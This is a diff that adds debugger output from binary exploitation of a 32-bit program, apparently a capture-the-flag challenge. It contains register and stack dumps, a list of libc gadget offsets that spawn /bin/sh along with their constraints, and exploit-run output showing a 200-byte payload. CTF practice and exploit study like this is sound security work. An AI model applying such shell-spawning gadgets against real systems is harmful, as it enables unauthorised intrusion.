@@ -1,0 +1,71 @@
+─────────────────────────────────[ REGISTERS ]──────────────────────────────────
+ EAX  0x0
+ EBX  0x56557fb4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x2ebc
+ ECX  0xffffcec8 ◂— 0xf7000a31 /* '1\n' */
+ EDX  0xf7fb089c (_IO_stdfile_0_lock) ◂— 0x0
+ EDI  0x0
+ ESI  0xf7faf000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d6c
+ EBP  0xffffcf98 —▸ 0xffffd4e8 —▸ 0xffffd4f8 ◂— 0x0
+ ESP  0xffffcec0 —▸ 0xf7fad200 (_IO_helper_jumps) ◂— 0x0
+ EIP  0x5655580b (least_fav+137) ◂— mov    ebx, dword ptr [ebp - 4]
+
+
+.got:00002FB4 _GLOBAL_OFFSET_TABLE_ dd offset _DYNAMIC
+
+
+───────────────────────────────────[ STACK ]────────────────────────────────────
+00:0000│ esp  0xffffcec0 —▸ 0xf7fad200 (_IO_helper_jumps) ◂— 0x0
+01:0004│      0xffffcec4 —▸ 0xf7fafdc7 (_IO_2_1_stdout_+71) ◂— 0xfb08900a
+02:0008│ ecx  0xffffcec8 ◂— 0xf7000a31 /* '1\n' */
+03:000c│      0xffffcecc —▸ 0xf7e47e77 (new_do_write+103) ◂— mov    edi, eax
+04:0010│      0xffffced0 —▸ 0xf7fafd80 (_IO_2_1_stdout_) ◂— 0xfbad2887
+05:0014│      0xffffced4 —▸ 0xf7fafdc7 (_IO_2_1_stdout_+71) ◂— 0xfb08900a
+06:0018│      0xffffced8 ◂— 0x1
+07:001c│      0xffffcedc —▸ 0xf7e47e77 (new_do_write+103) ◂— mov    edi, eax
+
+ 0x3d0d3 execve("/bin/sh", esp+0x34, environ)
+constraints:
+esi is the GOT address of libc
+[esp+0x34] == NULL
+
+0x3d0d5 execve("/bin/sh", esp+0x38, environ)
+constraints:
+esi is the GOT address of libc
+[esp+0x38] == NULL
+
+0x3d0d9 execve("/bin/sh", esp+0x3c, environ)
+constraints:
+esi is the GOT address of libc
+[esp+0x3c] == NULL
+
+0x3d0e0 execve("/bin/sh", esp+0x40, environ)
+constraints:
+esi is the GOT address of libc
+[esp+0x40] == NULL
+
+0x67a7f execl("/bin/sh", eax)
+constraints:
+esi is the GOT address of libc
+eax == NULL
+
+0x67a80 execl("/bin/sh", [esp])
+constraints:
+esi is the GOT address of libc
+[esp] == NULL
+
+0x137e5e execl("/bin/sh", eax)
+constraints:
+ebx is the GOT address of libc
+eax == NULL
+
+0x137e5f execl("/bin/sh", [esp])
+constraints:
+ebx is the GOT address of libc
+[esp] == NULL
+========================
+
+buf: 0x56646713
+Pay len: 200
+[*] Switching to interactive mode
+
+Do you want to learn an interesting fact about a number? (y/n)
